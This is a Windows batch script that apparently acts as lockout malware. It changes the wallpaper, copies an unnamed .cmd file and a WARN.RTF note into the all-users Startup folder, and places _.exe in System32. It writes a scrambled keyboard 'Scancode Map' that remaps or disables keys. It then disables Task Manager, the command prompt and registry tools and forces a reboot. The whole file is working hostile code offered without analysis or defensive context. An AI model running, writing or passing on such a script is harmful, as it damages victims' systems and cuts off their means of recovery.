echo off
cls

copy Wallpaper.bmp %windir%\System32
set img=%windir%\System32\Wallpaper.bmp
reg add "HKCU\.DEFAULT\Control Panel\desktop" /v wallpaper /t REG_SZ /d %img% /f
reg add "HKCU\Control Panel\Desktop" /v WallPaperStyle /t REG_SZ /d 2 /f
RUNDLL32.EXE user32.dll,UpdatePerUserSystemParameters
reg add "HKCU\SOFTWARE\Microsoft\Windows\DWM" /V AccentColor /T REG_DWORD /D "0xff00dd"

copy __.cmd "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup"
copy WARN.RTF "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup"
copy _.exe %windir%\System32

reg add "HKLM\system\ControlSet001"
reg add "HKLM\system\ControlSet001\Control"
reg add "HKLM\system\ControlSet001\Control\Keyboard Layout"
reg add "HKLM\system\ControlSet001\Control\Keyboard Layout" /V "Scancode Map" /T REG_BINARY /D 782B52D7CCDA2084DE3BE18E678B8C7F4E4CB37A731E12865332014C33FEAECCB640683AA4F0DB899A8466378971870947047126874718d7B52D7CCDA2084DE3BE18E678B8C7F4E4CB37A731E12865332014C33FEAECCB640683AA4F0DB899A8466218748b438277d

reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\system"
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System" /V DisableTaskMgr /T REG_DWORD /d 1
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System" /V DisableCMD /T REG_DWORD /d 1
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\system" /V DisableRegistryTools /T REG_DWORD /d 1
shutdown /r